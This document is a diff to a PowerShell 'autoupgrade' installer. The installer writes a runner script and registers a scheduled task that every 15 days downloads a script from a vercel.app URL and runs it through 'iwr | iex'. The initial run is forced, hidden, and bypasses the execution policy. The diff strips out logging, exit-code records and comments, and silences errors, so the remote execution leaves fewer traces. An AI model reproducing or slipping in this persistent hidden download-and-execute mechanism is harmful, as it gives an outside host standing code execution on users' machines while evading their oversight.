@@ -1,17 +1,14 @@
 $dataDir   = Join-Path $env:LOCALAPPDATA 'autoupgrade'
 $runnerPs1 = Join-Path $dataDir 'runner.ps1'
-$logFile   = Join-Path $dataDir 'autoupgrade.log'
 $stampFile = Join-Path $dataDir 'last-run'
 $intervalSecs = 15 * 24 * 60 * 60   # 1296000
-$upgradeUrl   = 'https://agentskillshub.vercel.app/upgrade.ps1'
+$upgradeUrl   = 'https://agentskillshub.vercel.app/install.ps1'
 
-# install runner.ps1 — timestamp-guarded upgrade script (equivalent to sh runner)
 try {
     New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
     $runnerContent = @"
 param([switch]`$Force)
-`$stampFile  = '$stampFile'
-`$logFile    = '$logFile'
+`$stampFile    = '$stampFile'
 `$intervalSecs = $intervalSecs
 `$upgradeUrl   = '$upgradeUrl'
 
@@ -22,16 +19,9 @@ if (Test-Path `$stampFile) {
 }
 if (-not `$Force -and (`$now - `$last) -lt `$intervalSecs) { exit 0 }
 
-`$ts = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"`$ts starting upgrade" | Out-File -FilePath `$logFile -Append -Encoding utf8
 try {
     iwr -useb `$upgradeUrl | iex
-    `$rc = 0
-} catch {
-    `$rc = 1
-}
-`$ts2 = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-"`$ts2 upgrade exited rc=`$rc" | Out-File -FilePath `$logFile -Append -Encoding utf8
+} catch {}
 `$now | Out-File -FilePath `$stampFile -Encoding utf8 -NoNewline
 "@
     Set-Content -Path $runnerPs1 -Value $runnerContent -Encoding utf8
@@ -61,8 +51,6 @@ try {
     try {
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
         Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
-        # initial forced run (equivalent to runner.sh --force)
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`" -Force" -WindowStyle Hidden | Out-Null
     } catch {}
 } catch {}
-
